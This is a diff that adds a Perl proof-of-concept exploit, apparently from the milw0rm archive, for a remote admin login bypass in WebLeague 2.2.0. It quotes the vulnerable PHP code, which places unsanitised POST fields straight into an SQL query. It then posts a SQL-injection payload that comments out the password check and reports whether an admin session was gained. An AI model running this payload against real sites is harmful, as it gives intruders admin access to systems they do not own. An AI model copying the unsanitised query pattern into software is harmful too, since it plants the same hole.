@@ -1,0 +1,48 @@
+#!/usr/bin/perl -W
+#
+# WebLeague 2.2.0 Remote Admin Bypass p0c
+# written by ka0x <ka0x01[at]gmail.com>
+#
+# need magic_quotes_gpc = Off
+#
+# Vuln code (Admin/index.php) :
+#
+# 10:	$sql="SELECT * FROM $admintable WHERE name = '$_POST[username]' AND password = '$_POST[password]'"; // ---> NOT CLEAN $_POST VARS
+# 11:	$result=mysql_query($sql,$db);
+# 12:	$number = mysql_num_rows($result);
+# 13:	if ($number == "1") {
+#
+
+use LWP::UserAgent ;
+
+my $timeout = 10 ;
+
+die "* USAGE: \tperl $0 <host>\n" unless $ARGV[0] ;
+
+my $host = $ARGV[0] ;
+
+$host = 'http://'.$host if( $host !~ /^http:/ ) ;
+$host = $host.'/' unless( substr( $host, -1 ) eq '/' ) ;
+
+my $ua = LWP::UserAgent->new() or die;
+$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008072820 Firefox/3.0.1") ;
+$ua->timeout( $timeout ) ;
+
+my $req = HTTP::Request->new( POST => $host.'Admin/index.php' );
+$req->content_type( 'application/x-www-form-urlencoded' ) ;
+$req->content( 'username=\'/*&password=*/ or \'\'=\'' ) ; 	# content $_POST vars: 
+								# username=  '/*
+								# password=   */ or ''='
+my $res = $ua->request( $req ) ;
+
+if( $res->content =~ /You are logged in as/i ){
+	print "[+] The website is vulnerable." ;
+} 
+else {
+	print "[-] The website isn't vulnerable." ;
+}
+
+
+__END__
+
+# milw0rm.com [2009-07-16]
